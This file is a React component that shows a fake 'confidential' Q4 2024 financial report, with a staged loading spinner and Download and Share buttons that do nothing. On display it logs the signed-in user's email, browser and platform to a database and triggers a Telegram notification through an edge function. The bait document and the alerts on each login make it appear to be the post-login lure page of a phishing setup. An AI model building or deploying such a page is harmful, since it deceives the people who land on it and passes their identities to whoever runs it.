import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { FileText, Download, Share2, LogOut, Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useAuth } from '@/hooks/useAuth';
import { supabase } from '@/lib/supabase';

const DocumentViewer = () => {
  const { user, signOut } = useAuth();
  const [docLoading, setDocLoading] = useState(true);
  const [activityLogged, setActivityLogged] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setDocLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Log activity + send Telegram notification
  useEffect(() => {
    if (!user || activityLogged) return;

    const logActivity = async () => {
      const userAgent = navigator.userAgent;
      const email = user.email || 'unknown';

      // Insert activity record
      await supabase.from('login_activity').insert({
        user_email: email,
        ip_address: null, // Will be captured server-side
        user_agent: userAgent,
        device_info: navigator.platform || 'unknown',
      });

      // Notify via edge function
      try {
        await supabase.functions.invoke('notify-login', {
          body: { email, user_agent: userAgent, device_info: navigator.platform },
        });
      } catch (e) {
        console.log('Telegram notification skipped');
      }

      setActivityLogged(true);
    };

    logActivity();
  }, [user, activityLogged]);

  if (docLoading) {
    return (
      <div className="min-h-screen bg-doc-surface flex flex-col items-center justify-center gap-4">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 1, ease: 'linear' }}
        >
          <Loader2 className="h-10 w-10 text-primary" />
        </motion.div>
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="text-sm text-muted-foreground"
        >
          Loading document...
        </motion.p>
      </div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.5 }}
      className="min-h-screen bg-doc-surface"
    >
      {/* Header */}
      <div className="bg-card border-b border-border px-4 py-3 flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center gap-3">
          <FileText className="h-6 w-6 text-primary" />
          <div>
            <h1 className="text-sm font-semibold text-foreground">Q4_Financial_Report_2024.pdf</h1>
            <p className="text-xs text-muted-foreground">Viewing as {user?.email}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon"><Download className="h-4 w-4" /></Button>
          <Button variant="ghost" size="icon"><Share2 className="h-4 w-4" /></Button>
          <Button variant="outline" size="sm" onClick={signOut}>
            <LogOut className="h-4 w-4 mr-1" /> Logout
          </Button>
        </div>
      </div>

      {/* Full Document */}
      <div className="max-w-3xl mx-auto py-8 px-4">
        <div className="bg-card rounded-xl shadow-lg border border-border p-8 md:p-12 space-y-8">
          <div className="border-b border-border pb-6">
            <h2 className="text-2xl font-bold text-foreground mb-1">Quarterly Financial Report</h2>
            <p className="text-sm text-muted-foreground">Fiscal Year 2024 · Q4 Summary</p>
            <p className="text-xs text-muted-foreground mt-1">Prepared by Finance Division · Confidential</p>
          </div>

          <Section title="Executive Summary">
            <p>This report provides a comprehensive overview of the company's financial performance during the fourth quarter of fiscal year 2024. Revenue growth exceeded projections by 12%, driven primarily by expansion in the enterprise segment and successful product launches in Q3.</p>
            <p>Operating margins improved to 28.4%, reflecting ongoing cost optimization initiatives and favorable market conditions. The company maintained strong cash flow generation, ending the quarter with $142M in available liquidity.</p>
          </Section>

          <Section title="Key Metrics">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { label: 'Revenue', value: '$48.2M', change: '+12%' },
                { label: 'Net Income', value: '$13.7M', change: '+8%' },
                { label: 'Active Users', value: '2.1M', change: '+24%' },
                { label: 'Retention', value: '94.2%', change: '+1.8%' },
              ].map((m) => (
                <div key={m.label} className="bg-muted rounded-lg p-3">
                  <p className="text-xs text-muted-foreground">{m.label}</p>
                  <p className="text-lg font-bold text-foreground">{m.value}</p>
                  <p className="text-xs font-medium text-success">{m.change}</p>
                </div>
              ))}
            </div>
          </Section>

          <Section title="Revenue Breakdown">
            {[
              { name: 'Enterprise Solutions', pct: 45 },
              { name: 'SaaS Subscriptions', pct: 30 },
              { name: 'Professional Services', pct: 15 },
              { name: 'Other Revenue', pct: 10 },
            ].map((item) => (
              <div key={item.name} className="flex items-center gap-3 mb-2">
                <span className="text-sm text-doc-text w-44">{item.name}</span>
                <div className="flex-1 bg-muted rounded-full h-2">
                  <div className="bg-primary rounded-full h-2 transition-all duration-1000" style={{ width: `${item.pct}%` }} />
                </div>
                <span className="text-sm font-medium text-foreground w-10 text-right">{item.pct}%</span>
              </div>
            ))}
          </Section>

          <Section title="Strategic Outlook">
            <p>Looking ahead to Q1 2025, we anticipate continued momentum in enterprise sales with a projected 15-18% revenue increase. Key initiatives include:</p>
            <ul className="list-disc pl-5 space-y-1 text-sm text-doc-text">
              <li>Launch of the Enterprise Cloud Platform v3.0</li>
              <li>Expansion into APAC markets with new partnerships</li>
              <li>Investment in AI-powered analytics features</li>
              <li>Hiring 200+ engineers across R&D teams</li>
            </ul>
          </Section>

          <Section title="Risk Factors">
            <p>The company continues to monitor macroeconomic conditions, competitive pressures, and regulatory changes that may impact future performance. Foreign exchange fluctuations remain a key variable for international revenue streams.</p>
          </Section>

          <div className="border-t border-border pt-6 text-xs text-muted-foreground text-center">
            <p>This document is confidential and intended for authorized personnel only.</p>
            <p className="mt-1">© 2024 Company, Inc. All rights reserved.</p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

const Section = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-3">
    <h3 className="text-lg font-semibold text-foreground">{title}</h3>
    <div className="text-sm leading-relaxed text-doc-text space-y-3">{children}</div>
  </div>
);

export default DocumentViewer;
